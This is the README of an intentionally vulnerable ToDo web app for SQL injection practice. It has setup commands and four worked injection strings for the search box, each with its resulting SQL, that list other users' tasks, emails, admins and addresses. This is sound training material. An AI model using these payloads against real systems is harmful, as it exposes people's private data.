# SQL Injection

## Description

This is a ToDo app. One can sign up and create their own ToDos and find them in their ToDo list. This app lets you perform SQL injection in the ToDo search Bar. While, a secure code is available (public/secured_code.txt), you can implement it to see the prevention of SQL injection.

## Build docker images

```bash
docker-compose build
```

(Note: open the desktop docker as you run the commands; easy to debug if you have any trouble - optional)

## Run the application

```bash
docker-compose up -d
```

Run the sql_injection_web_1 container

## Load CSS

```bash
docker exec -it sql_injection_web_1 bash
rails tailwindcss:watch
```

## Open application in browser and perform below attacks

```bash
http://<localhost or server-ip>:3000
```

## Signup to the application

Create user(s)

## Seed Data

```bash
Ctrl + c
rake db:seed
rails tailwindcss:watch
```

`rake db:seed` creates users with their respective tasks

## For Development

Once you clone the repository, perform the following commands:

Setup the database:  

- `rake db:create`
- `rake db:migrate`

Access the [localhost](http://localhost:3000/) and sign up.  
If you'd want to create users and their ToDos, run `rake db:seed`  
Incase your css doesn't load, run `rails tailwindcss:watch`

## SQL injection queries

Various ways to perform SQL injection:  

**ATTACK 1: Listing ToDos of all users**  
_Approach_  
The two hypen characters -- prevents anything after them in the query from being run. Thus, on inputing the below string in the search box  
`ToDo name' or 1=1) --`  
_Result_  
the query executes the following SQL:  
`ToDo Load (0.5ms)  SELECT "to_dos".* FROM "to_dos" WHERE (name = 'ToDo name' or 1=1) --' and user_id = '1')`  
While only the current user's ToDos are to be listed, as anything after -- is ignored, the SQL query **results in displaying ToDos of all the users from the database!**

**ATTACK 2: Displaying all users**  
_Approach_
The search field wasn’t even designed to return users, but we can make it happen.  
`ToDo name') union select 1, email,'', null, null, null, null from users --`
_Result_  
In this app, the above query executes the following SQL:  
`ToDo Load (2.7ms)  SELECT "to_dos".* FROM "to_dos" WHERE (name = 'ToDo name') union select 1, email,'', null, null, null, null from users --' and user_id = '1')`  
What happens is the union with the users table, adding those records to what is displayed. **This SQL query results in displaying all the users from the database!**  

**ATTACK 3: Find which users are admins**  
_Approach_  
`ToDo name') union select 1, email,'', null, null, null, null from users where admin = true --`  
_Result_  
the query executes the following SQL:
`ToDo Load (2.5ms)  SELECT "to_dos".* FROM "to_dos" WHERE (name = 'ToDo name') union select 1, email,'', null, null, null, null from users where admin = true --' and user_id = '1')`  
**Thus, displaying all the admins from the database!** As an attacker, now one knows the admins. As admins are likely well-trusted within the company, if ones wants to pretend to be someone over the email or phone to gain more data/information, it’s a great place to start.

**ATTACK 4: Get user addresses or any such attribute**
_Approach_  
`ToDo name') union select 1, email, address, null, null, null, null from users --`  
_Result_  
the query executes the following SQL:  
`ToDo Load (0.6ms)  SELECT "to_dos".* FROM "to_dos" WHERE (name = 'ToDo name') union select 1, email, address, null, null, null, null from users --' and user_id = '1')`  
**Thus, displaying an extra column which displays all the users' addresses!** This could be very bad, as any similar attribute such as credit card details e.t.c sensitive information can be accessed.
